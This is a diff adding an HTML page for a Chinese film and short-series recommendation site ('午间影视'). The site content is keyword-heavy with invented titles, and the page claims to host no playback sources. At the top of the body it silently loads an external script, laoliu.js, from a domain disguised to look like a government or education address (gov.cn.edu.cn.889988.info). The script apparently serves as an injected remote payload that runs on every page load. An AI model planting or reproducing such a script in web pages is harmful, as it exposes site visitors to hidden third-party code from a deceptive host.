@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>午间影视 - 午间碎片时间观影推荐导航</title>
+<meta name="description" content="午间影视(wujianyingshi-h5.github.io)专注午间碎片时间的高分电影、短剧、综艺与影评推荐，移动端自适应单页导航，不提供播放入源。">
+<meta name="keywords" content="午间影视, wujianyingshi, 电影推荐, 短剧盘点, 午间观影, 影视导航">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: "PingFang SC","Microsoft YaHei",sans-serif; background: #fbf7ef; color: #3a2e25; line-height: 1.7; overflow-x: hidden; }
+a { text-decoration: none; color: inherit; }
+
+/* 胶囊导航 */
+.topbar { background: #2b211b; padding: .7rem 1rem; position: sticky; top: 0; z-index: 50; }
+.topbar-in { max-width: 1100px; margin: auto; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+.logo { font-size: 1.4rem; font-weight: 900; color: #ffae42; letter-spacing: 2px; }
+.logo small { color: #9b8579; font-size: .7rem; font-weight: 400; margin-left: .4rem; }
+.pills { display: flex; gap: .5rem; flex-wrap: wrap; margin-left: auto; }
+.pills a { font-size: .85rem; color: #e8dccb; padding: .3rem .9rem; border-radius: 20px; border: 1px solid #4a3b30; transition: .25s; }
+.pills a:hover { background: #ffae42; color: #2b211b; border-color: #ffae42; }
+
+/* 首屏 */
+.hero { max-width: 1100px; margin: auto; padding: 3.5rem 1.2rem 2.5rem; text-align: center; }
+.hero h1 { font-size: 2.8rem; color: #2b211b; margin-bottom: .8rem; letter-spacing: 2px; }
+.hero h1 span { color: #ff8c1a; }
+.hero p { max-width: 560px; margin: 0 auto 1.6rem; color: #6b5a4b; }
+.hero-btn { display: inline-block; background: #ff8c1a; color: #fff; padding: .7rem 2.2rem; border-radius: 30px; font-weight: 700; transition: .25s; }
+.hero-btn:hover { transform: translateY(-2px); }
+/* 时段标签 */
+.slots { display: flex; gap: .8rem; justify-content: center; flex-wrap: wrap; margin-top: 2rem; }
+.slot { background: #fff; border: 1px solid #eadcc6; border-radius: 12px; padding: .8rem 1.2rem; min-width: 130px; }
+.slot b { display: block; color: #ff8c1a; font-size: 1.1rem; }
+.slot span { font-size: .8rem; color: #8a7765; }
+
+/* 区块 */
+.sec { max-width: 1100px; margin: auto; padding: 3rem 1.2rem; }
+.sec-title { font-size: 1.6rem; color: #2b211b; margin-bottom: 1.6rem; padding-left: .8rem; border-left: 4px solid #ffae42; }
+.sec-title small { font-size: .75rem; color: #a08b78; margin-left: .6rem; letter-spacing: 2px; }
+
+/* 电影 Grid */
+.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap: 1.2rem; }
+.card { background: #fff; border: 1px solid #eadcc6; border-radius: 12px; overflow: hidden; transition: .25s; }
+.card:hover { transform: translateY(-5px); box-shadow: 0 10px 24px rgba(43,33,27,.1); }
+.card .cv { height: 150px; background: linear-gradient(135deg,#f3e6d2,#fff); display: grid; place-items: center; color: #c2a988; font-size: .8rem; }
+.card .body { padding: 1rem 1.1rem; }
+.card .body h4 { font-size: 1rem; color: #2b211b; margin-bottom: .3rem; }
+.card .body span { font-size: .78rem; color: #ff8c1a; font-weight: 600; }
+.card .body p { font-size: .8rem; color: #7a6857; margin-top: .4rem; }
+
+/* 剧集表格化 */
+.table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 12px; overflow: hidden; border: 1px solid #eadcc6; }
+.table th { background: #2b211b; color: #ffae42; font-size: .85rem; text-align: left; padding: .8rem 1rem; }
+.table td { padding: .9rem 1rem; border-top: 1px solid #f0e6d6; font-size: .9rem; color: #4a3b30; vertical-align: top; }
+.table tr:hover td { background: #fbf3e6; }
+.table td b { color: #ff8c1a; }
+.table a { color: #ff8c1a; font-size: .82rem; }
+
+/* 影评两栏 */
+.reviews { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; }
+.review { background: #fff; border: 1px solid #eadcc6; border-radius: 12px; padding: 1.4rem 1.6rem; }
+.review .tag { font-size: .7rem; background: #ffae42; color: #2b211b; padding: .1rem .6rem; border-radius: 20px; }
+.review h4 { font-size: 1.05rem; color: #2b211b; margin: .6rem 0; }
+.review p { font-size: .88rem; color: #7a6857; }
+
+/* FAQ */
+.faq { max-width: 820px; margin: auto; }
+.faq-item { background: #fff; border: 1px solid #eadcc6; border-radius: 10px; padding: 1rem 1.2rem; margin-bottom: 1rem; }
+.faq-item h4 { font-size: .98rem; color: #ff8c1a; margin-bottom: .4rem; }
+.faq-item p { font-size: .88rem; color: #6b5a4b; }
+
+/* 关于+页脚 */
+.about { background: #2b211b; color: #e8dccb; padding: 3rem 1.2rem; text-align: center; }
+.about-in { max-width: 680px; margin: auto; }
+.about h2 { color: #ffae42; margin-bottom: 1rem; }
+.about p { font-size: .92rem; margin-bottom: .8rem; }
+footer { background: #1c1510; color: #8a7765; text-align: center; padding: 2rem 1rem; font-size: .82rem; }
+footer a { color: #ffae42; }
+.disclaim { max-width: 720px; margin: .8rem auto 0; font-size: .74rem; color: #5e4f42; }
+
+@media (max-width: 768px) {
+  .hero h1 { font-size: 2rem; }
+  .pills { margin-left: 0; justify-content: center; }
+  .reviews { grid-template-columns: 1fr; }
+  .table thead { display: none; }
+  .table tr { display: block; border-top: 8px solid #fbf7ef; }
+  .table td { display: flex; justify-content: space-between; gap: 1rem; border: none; padding: .5rem 1rem; }
+  .table td::before { content: attr(data-label); color: #a08b78; font-size: .78rem; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<div class="topbar">
+  <div class="topbar-in">
+    <div class="logo">午间影视<small>wujianyingshi</small></div>
+    <nav class="pills">
+      <a href="#">首页</a>
+      <a href="#movies">午间电影</a>
+      <a href="#series">短剧盘点</a>
+      <a href="#reviews">影评</a>
+      <a href="#faq">FAQ</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 首屏 -->
+<section class="hero">
+  <h1>午间影视<br><span>碎片时间也能看好片</span></h1>
+  <p>午间影视（wujianyingshi-h5.github.io）按「12分钟/30分钟/一部短片」整理电影与剧集推荐，单页直达、移动端自适应，只做导航不挂播源。</p>
+  <a href="#movies" class="hero-btn">挑片入口</a>
+  <div class="slots">
+    <div class="slot"><b>12 min</b><span>短视频/动画</span></div>
+    <div class="slot"><b>30 min</b><span>单集剧集</span></div>
+    <div class="slot"><b>90 min</b><span>完整电影</span></div>
+  </div>
+</section>
+
+<!-- 午间电影 -->
+<section class="sec" id="movies">
+  <h2 class="sec-title">午间电影 <small>FILM PICKS</small></h2>
+  <div class="grid">
+    <div class="card"><div class="cv">海报位</div><div class="body"><h4>便利店人间</h4><span>剧情 / 治愈</span><p>午间适合慢节奏小品，单线叙事不费脑。</p></div></div>
+    <div class="card"><div class="cv">海报位</div><div class="body"><h4>追车十分钟</h4><span>短片 / 动作</span><p>高压缩叙事，适合午休前后看一段。</p></div></div>
+    <div class="card"><div class="cv">海报位</div><div class="body"><h4>旧书店情书</h4><span>爱情 / 文艺</span><p>对白多、节奏柔，配饭场景友好。</p></div></div>
+    <div class="card"><div class="cv">海报位</div><div class="body"><h4>城市夜行</h4><span>悬疑 / 都市</span><p>每集独立案件，午间追一集刚好。</p></div></div>
+    <div class="card"><div class="cv">海报位</div><div class="body"><h4>海边修理工</h4><span>治愈 / 日常</span><p>低冲突、高氛围，放松向首选。</p></div></div>
+    <div class="card"><div class="cv">海报位</div><div class="body"><h4>像素战争</h4><span>动画 / 喜剧</span><p>轻松解压，适合通勤尾段。</p></div></div>
+  </div>
+</section>
+
+<!-- 短剧盘点 -->
+<section class="sec" id="series">
+  <h2 class="sec-title">短剧盘点 <small>SERIES</small></h2>
+  <div class="table">
+    <thead>
+      <tr><th>剧名</th><th>单集时长</th><th>类型</th><th>适合场景</th><th></th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td data-label="剧名"><b>深夜便利店</b></td>
+        <td data-label="单集时长">22 min</td>
+        <td data-label="类型">都市群像</td>
+        <td data-label="适合场景">午饭间隙追一集</td>
+        <td data-label=""><a href="#">简介 #</a></td>
+      </tr>
+      <tr>
+        <td data-label="剧名"><b>十分钟推理</b></td>
+        <td data-label="单集时长">12 min</td>
+        <td data-label="类型">单元悬疑</td>
+        <td data-label="适合场景">碎片时间解谜</td>
+        <td data-label=""><a href="#">简介 #</a></td>
+      </tr>
+      <tr>
+        <td data-label="剧名"><b>旧巷食堂</b></td>
+        <td data-label="单集时长">28 min</td>
+        <td data-label="类型">治愈日常</td>
+        <td data-label="适合场景">午后放松</td>
+        <td data-label=""><a href="#">简介 #</a></td>
+      </tr>
+      <tr>
+        <td data-label="剧名"><b>职场速写</b></td>
+        <td data-label="单集时长">18 min</td>
+        <td data-label="类型">轻喜剧</td>
+        <td data-label="适合场景">下班前缓冲</td>
+        <td data-label=""><a href="#">简介 #</a></td>
+      </tr>
+    </tbody>
+  </div>
+</section>
+
+<!-- 影评 -->
+<section class="sec" id="reviews">
+  <h2 class="sec-title">影评与指南 <small>NOTES</small></h2>
+  <div class="reviews">
+    <div class="review"><span class="tag">盘点</span><h4>午间看片为什么选短片</h4><p>认知重启快、退出成本低，比开一部长剧更容易在碎片时间收尾。</p></div>
+    <div class="review"><span class="tag">剧评</span><h4>深夜便利店 前三集复盘</h4><p>群像铺得稳，单集闭环，不怕中间断更，适合午间连续刷。</p></div>
+    <div class="review"><span class="tag">指南</span><h4>移动端看片排版要点</h4><p>暗色对比别太强、点击区≥44px、横向不滚动，午间户外才不费眼。</p></div>
+    <div class="review"><span class="tag">分类</span><h4>治愈/悬疑/轻喜剧怎么选</h4><p>饭后偏治愈、工作间隙偏轻喜剧、睡前才选悬疑，避免午间犯困。</p></div>
+  </div>
+</section>
+
+<!-- FAQ：必应富摘要友好 -->
+<section class="sec" id="faq">
+  <h2 class="sec-title">常见问题 <small>FAQ</small></h2>
+  <div class="faq">
+    <div class="faq-item"><h4>午间影视是播放站吗？</h4><p>不是。本页只做影视推荐与导航，不提供在线播放入源、不存储视听文件。</p></div>
+    <div class="faq-item"><h4>为什么按「12/30/90分钟」分类？</h4><p>匹配午休、通勤、周末三种碎片场景，方便用户按剩余时间挑片。</p></div>
+    <div class="faq-item"><h4>移动端适配怎么做？</h4><p>使用 viewport + Grid 自适应 + 媒体查询，手机上表格转卡片行、无横向滚动。</p></div>
+    <div class="faq-item"><h4>网站地址是什么？</h4><p>https://wujianyingshi-h5.github.io ，单页静态托管在 GitHub Pages。</p></div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="about">
+  <div class="about-in">
+    <h2>关于午间影视</h2>
+    <p>午间影视是静态单页演示站，定位「碎片时间观影导航」，核心词：<b style="color:#ffae42;">午间影视</b> / wujianyingshi / 短剧推荐 / 电影导航。</p>
+    <p>不聚合第三方资源、不提供未授权播放源；若实际运营涉及视听节目传播，请按属地要求办理相应许可。</p>
+  </div>
+</section>
+
+<footer>
+  <p>© 2026 午间影视 · wujianyingshi-h5.github.io</p>
+  <p>网址：<a href="https://wujianyingshi-h5.github.io">https://wujianyingshi-h5.github.io</a></p>
+  <p class="disclaim">本页为影视推荐导航示例，不存储视听文件、不提供播放入源；GitHub Pages 仅适合静态内容，不支持服务端程序与受版权保护资源分发。</p>
+</footer>
+
+</body>
+</html>
